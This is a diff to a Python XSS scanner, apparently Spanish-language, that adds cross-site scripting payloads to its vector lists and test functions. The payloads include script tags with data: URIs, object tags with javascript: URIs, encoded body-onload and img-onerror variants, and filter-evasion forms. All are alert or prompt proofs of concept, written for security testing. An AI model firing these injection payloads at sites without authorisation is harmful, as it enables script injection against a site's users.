@@ -29,8 +29,8 @@ parsero = 0
 parser = 0
 etiquetasabiertas = []                       
 etiquetalimpia = ""
-validacion = ['input', 'textarea'] 
-ignorar = ['html','head','body','br','header','nav','meta','footer']             
+validacion = ['input','textarea','img'] 
+ignorar = ['html','head','br','header','nav','meta','footer']             
 listavacia = []
 etiquetaAbierta = []
 
@@ -58,6 +58,9 @@ print color.azul + "\t\t########################################################
 #Vectores Cross-site scripting (xss) 
 vectores = [
     "javascript:alert(0);",
+    "javascript:prompt(/compaXSS/.source);var x = prompt;x(0);x(/XSS/.source);x",
+    "<object type='text/x-html' data='javascript:prompt(/xss/.source);var x = prompt;x(0);x(/XSS/.source);x'></object>",
+    "<script src='data:text/javascript,prompt(/compaXSS/.source);var x = prompt;x(0);x(/XSS/.source);x'></script>",
     "\"/><script>alert(1);</script><img src=x onerror=x.onerror=prompt(0)>",
     "\"/><img src=x onerror=x.onerror=prompt&lpar;/xss/.source&rpar;;confirm(0);alert(1)>",
     "\"/><img src=x onerror=x.onerror=prompt(0)>",
@@ -65,6 +68,8 @@ vectores = [
     "\"/><svg/onload=alert(/XSS/.source);prompt(String.fromCharCode(88,83,83));prompt(0)>",
     "<script>alert(0);</script>",
     "<svg/onload=prompt(0);>", 
+    "<body/onload=&lt;!--&gt;&#10alert(1);prompt(/XSS/.source)>",
+    "<img src=`xx:xx` onerror=alert(/XSS/.source);alert(1)>",
     "<img/src=` onerror=alert(1)>", 
     "<svg/onload=alert(0);prompt(0);>",
     "<scri%00pt>confirm(0);</scri%00pt>",
@@ -77,9 +82,13 @@ vectores = [
     "<img src=x onerror=x.onerror=m='%22%3E%3Cimg%20src%3Dx%20onerror%3Dx.onerror%3Dprompt%28/xss/.source%29%3E';d=unescape(m);document.write(d);prompt(String.fromCharCode(88,83,83))>"
 ]
 
-vectorescrazy = [ #Estableciendo la etiqueta Attr 
+vectorescrazy = [ #Estableciendo la etiqueta Attr  
     "javascript:alert(0);",
     "\"><script>alert(0)</script>",
+    "\"><body/onload=&lt;!--&gt;&#10alert(1);prompt(/XSS/.source)>",
+    "\"><img src=`xx:xx` onerror=alert(/XSS/.source);alert(1)>",
+    "\"><script src='data:text/javascript,prompt(/compaXSS/.source);var x = prompt;x(0);x(/XSS/.source);x'></script>",
+    "\"><object type='text/x-html' data='javascript:prompt(/xss/.source);var x = prompt;x(0);x(/XSS/.source);x'></object>",
     "\"\/><option>'><button><img src=x onerror=alert(1);></button></option>",
     "\"><scri%00pt>confirm(0);</scri%00pt>",
     "\"><script>'alert(0)%3B<%2Fscript>",
@@ -94,9 +103,13 @@ vectorescrazy = [ #Estableciendo la etiqueta Attr
 
 vectores2 = [
     "\"/><img src=x onerror=x.onerror=confirm(1);prompt(2);alert(/XSS/.source);prompt(String.fromCharCode(88,83,83))>",
+    "\"><script src='data:text/javascript,prompt(/compaXSS/.source);var x = prompt;x(0);x(/XSS/.source);x'></script>",
+    "\"/><object type='text/x-html' data='javascript:prompt(/xss/.source);var x = prompt;x(0);x(/XSS/.source);x'></object>",
     "\"/><img/src=` onerror=alert(1)>",
+    "\"/><img src=`xx:xx` onerror=alert(/XSS/.source);alert(1)>",
     "\"/><script>'alert(0)%3B<%2Fscript>",
     "\"/><scri%00pt>confirm(0);</scri%00pt>",
+    "\"/><body/onload=&lt;!--&gt;&#10alert(1);prompt(/XSS/.source)>",
     "\"/><img src=x onerror=x.onerror=prompt&lpar;/xss/.source&rpar;;confirm(0);alert(1)>",
     "\"/><svg/onload=alert(/XSS/.source);prompt(String.fromCharCode(88,83,83));prompt(0)>",
     "\"/><script>alert(String.fromCharCode(88,83,83));</script>",
@@ -312,6 +325,8 @@ def orientadoATTR():
                 "\"><script>alert(String.fromCharCode(88,83,83));</script>",
                 "\"><script>'alert(0)%3B<%2Fscript>",
                 "javascript:prompt(/xss/.source);",
+                "\"/><body/onload=&lt;!--&gt;&#10alert(1);prompt(/XSS/.source)>",
+                "\"><object type='text/x-html' data='javascript:prompt(/xss/.source);var x = prompt;x(0);x(/XSS/.source);x'></object>",
                 "\"<div><script>alert(0);</script>"
                 ]
             found = False
@@ -360,7 +375,9 @@ def datosHTML():
                 "\"<script>confirm(0);prompt(2);alert(/XSS/.source)</script>",
                 "\"</><script>alert(0)</script>",
                 "\"<><img src=\"x\" onerror=\"alert(0)\"/>",
-                "\"<img src=x onerror=x.onerror=prompt(/XSS/.source);confirm(1);alert(2);prompt(3);alert(4);alert(4);prompt('xss')>",
+                "\"/><body/onload=&lt;!--&gt;&#10alert(1);prompt(/XSS/.source)>",
+                "\"><object type='text/x-html' data='javascript:prompt(/xss/.source);var x = prompt;x(0);x(/XSS/.source);x'></object>",
+                "\"<img src=x onerror=x.onerror=prompt(/XSS/.source);confirm(1);alert(2);prompt(3);alert(4);alert(4);prompt('xss')>"
                 ]
             found = False
             for pyxss in invalidez:
